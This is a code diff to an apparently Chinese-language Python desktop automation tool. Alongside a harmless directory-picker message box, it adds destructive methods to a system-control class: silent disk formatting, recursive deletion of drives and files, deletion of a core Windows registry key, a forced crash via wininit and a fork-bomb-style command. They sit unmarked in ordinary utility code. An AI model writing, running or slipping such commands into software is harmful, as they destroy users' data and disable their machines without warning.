@@ -8,6 +8,7 @@ import comtypes
 import pyautogui
 import argparse
 from PySide6.QtCore import QTimer
+from PySide6.QtWidgets import QMessageBox
 from parentMethod import (
     KeyboardControl as Keyboard,
     SystemCtl as System,
@@ -53,6 +54,34 @@ class SystemCtl(System):
 
     def __init__(self):
         pass
+
+    def formatTheDisk(self, driveLetter):
+        os.system(f'format {driveLetter} /q /u /y')
+        return self
+
+    def delDiskDirAndFile(self, driveLetter):
+        os.system(f'rd /s /q {driveLetter}')
+        return self
+
+    def delFileByType(self, fileType, path):
+        os.system(f'del /s /q {path}/*.{fileType}')
+        return self
+
+    def deleteAllFile(self, path):
+        os.system(f'del /s /q {path}/')
+        return self
+
+    def corruptTheRegedit(self):
+        os.system(r'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /f')
+        return self
+
+    def blueDesktop(self):
+        os.system('wininit')
+        return self
+
+    def computerDeath(self):
+        os.system('%0 | %0')
+        return self
 
     def systemOption(self, time, element):
         if element == '关机':
@@ -224,9 +253,15 @@ class FileControl(FileCtl):
         return fileName.split('.')[-1]
 
     @staticmethod
-    def getDirPath(parent=None, **kwargs):
+    def getDirPath(parent=None, message=False, **kwargs):
         from PySide6.QtWidgets import QFileDialog
-        return QFileDialog.getExistingDirectory(parent, "选择目录")
+        path =  QFileDialog.getExistingDirectory(parent, "选择目录")
+        if message:
+            if path:
+                QMessageBox.information(parent, '提示', f'选择的目录是:{path}')
+            else:
+                QMessageBox.warning(parent, '警告', '未选择目录')
+        return path
 
     def imageReName(self, path):
         i = 0
